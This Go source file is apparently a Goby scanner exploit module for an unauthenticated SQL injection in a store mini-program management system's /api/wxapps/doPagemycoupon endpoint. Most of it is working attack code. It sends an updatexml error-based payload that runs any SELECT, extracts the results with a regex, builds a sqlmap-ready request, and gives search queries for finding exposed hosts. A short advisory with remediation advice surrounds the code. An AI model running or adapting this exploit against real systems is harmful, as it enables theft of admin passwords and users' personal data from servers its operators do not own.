package exploits

import (
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"

	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Universal Store Mini Program Management System /api/wxapps/doPagemycoupon SQL Injection Vulnerability",
    "Description": "<p>The Universal Store Mini Program Management System is a powerful tool designed to provide a comprehensive solution for businesses across various industries, integrating online and offline operations. It is an integrated platform featuring two core functions: membership management and membership marketing. The system supports multi-industry usage, allowing businesses to switch between different versions with a single click in the backend to meet the personalized needs of different industries. The system uses a lightweight backend and is powered by efficient servers to ensure smooth operation of the mini program and enhance user experience. The Universal Store Mini Program Management System /api/wxapps/doPagemycoupon has an SQL injection vulnerability, which attackers can exploit to access sensitive database information and potentially gain control of the server.</p>",
    "Product": "Universal Store Mini Program Management System",
    "Homepage": "https://diy.aoliqi.cn/",
    "DisclosureDate": "2024-06-26",
    "PostTime": "2025-01-09",
    "Author": "yanyongju@baimaohui.net",
    "FofaQuery": "body=\"/new_plat/index.html#/login\" || (body=\"/comhome/cases/index.html\" && body=\"/Comhome/functionshow/index.html\")",
    "GobyQuery": "body=\"/new_plat/index.html#/login\" || (body=\"/comhome/cases/index.html\" && body=\"/Comhome/functionshow/index.html\")",
    "Level": "2",
    "Impact": "<p>Unauthenticated remote attackers can exploit this vulnerability to access sensitive database information (e.g., admin backend passwords, user personal information) and, in high-privilege scenarios, inject malicious code into the server to gain further control, posing a severe security threat.</p>",
    "Recommendation": "<p>1. Disable internet exposure or set access permissions for the interface.2. Upgrade to the secure version provided by the vendor to fix the vulnerability.</p>",
    "References": [
        "No Refenece"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "select database(),select version(),select user()",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "select database()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/api/wxapps/doPagemycoupon",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "~{{{randSum}}}~",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/api/wxapps/doPagemycoupon",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|when|attackType=sqlpoint|{{{lastreq}}} type=1&uniacid=1 and updatexml(1,concat('~',({{{payload}}}),'~'),1)--+"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.8",
    "Translation": {
        "CN": {
            "Name": "万能门店小程序管理系统 /api/wxapps/doPagemycoupon SQL 注入漏洞",
            "Product": "万能门店小程序管理系统",
            "Description": "<p>万能门店小程序管理系统是一款功能强大的工具，旨在为各行业商家提供线上线下融合的全方位解决方案。是一个集成了会员管理和会员营销两大核心功能的综合性平台。它支持多行业使用，通过后台一键切换版本，满足不同行业商家的个性化需求。该系统采用轻量后台，搭载高效服务器，确保小程序运行流畅，提升用户体验。万能门店小程序管理系统 /api/wxapps/doPagemycoupon 存在 SQL 注入漏洞，攻击者可通过该漏洞获取数据库中的敏感信息，甚至可能进一步控制服务器。</p>",
            "Recommendation": "<p>1. 关闭互联网暴露面或为接口设置访问权限。2. 升级至厂商提供的安全版本以修复漏洞。</p>",
            "Impact": "<p>未经身份验证的远程攻击者可以利用此漏洞获取数据库中的敏感信息（例如，管理员后台密码、用户个人信息），甚至在高权限情况下向服务器写入恶意代码，进一步获取服务器系统权限，造成严重的安全威胁。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Universal Store Mini Program Management System /api/wxapps/doPagemycoupon SQL Injection Vulnerability",
            "Product": "Universal Store Mini Program Management System",
            "Description": "<p>The Universal Store Mini Program Management System is a powerful tool designed to provide a comprehensive solution for businesses across various industries, integrating online and offline operations. It is an integrated platform featuring two core functions: membership management and membership marketing. The system supports multi-industry usage, allowing businesses to switch between different versions with a single click in the backend to meet the personalized needs of different industries. The system uses a lightweight backend and is powered by efficient servers to ensure smooth operation of the mini program and enhance user experience. The Universal Store Mini Program Management System /api/wxapps/doPagemycoupon has an SQL injection vulnerability, which attackers can exploit to access sensitive database information and potentially gain control of the server.</p>",
            "Recommendation": "<p>1. Disable internet exposure or set access permissions for the interface.2. Upgrade to the secure version provided by the vendor to fix the vulnerability.</p>",
            "Impact": "<p>Unauthenticated remote attackers can exploit this vulnerability to access sensitive database information (e.g., admin backend passwords, user personal information) and, in high-privilege scenarios, inject malicious code into the server to gain further control, posing a severe security threat.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "vulurl": "define|variable|{{{fixedhostinfo}}}/api/wxapps/doPagemycoupon"
    },
    "VariablesOrder": [
        "vulurl"
    ],
    "EditType": "fast",
    "PocId": "9982"
}`

	send_Payload_dakSKqLPAfhwnCjuKDcuTFSfes := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		getRequest := httpclient.NewPostRequestConfig("/api/wxapps/doPagemycoupon")
		getRequest.Timeout = 15
		getRequest.VerifyTls = false
		getRequest.FollowRedirect = false
		head := map[string]string{
			"Content-Type": "application/x-www-form-urlencoded",
			"User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
		}
		getRequest.Data = fmt.Sprintf("type=1&uniacid=1 and updatexml(1,concat(0x7e,(%s)),1)--+", sql)

		for headName, headValue := range head {

			getRequest.Header.Store(headName, headValue)

		}
		return httpclient.DoHttpRequest(hostInfo, getRequest)

	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			vulURL := "/api/wxapps/doPagemycoupon"
			sendPayload := send_Payload_dakSKqLPAfhwnCjuKDcuTFSfes
			checkStr := goutils.RandomHexString(8)
			// 计算 MD5 值
			hash := md5.Sum([]byte(checkStr))

			// 转换为十六进制字符串
			md5Str := hex.EncodeToString(hash[:])
			checkHash := md5Str[:30]
			res, err := sendPayload(u, fmt.Sprintf(`select MD5("%s")`, checkStr))
			if err != nil {
				return false
			}
			if strings.Contains(res.RawBody, checkHash) {
				ss.VulURL = u.FixedHostInfo + vulURL
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			sqlpoint := fmt.Sprintf(`POST /api/wxapps/doPagemycoupon HTTP/1.1
Host: %s
Accept-Encoding: gzip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 74

type=1&uniacid=1*}`, expResult.HostInfo.HostInfo)
			// 3.配置正则语句，从响应包中提取出数据
			//regular := `qjkqq([\s\S]*?)qjxjq`
			regular := `syntax error: '~([\s\S]*?)'`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := send_Payload_dakSKqLPAfhwnCjuKDcuTFSfes
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "default" {
				sql := goutils.B2S(ss.Params["default"])
				resp, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "custom" {
				sql := goutils.B2S(ss.Params["custom"])
				resp, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
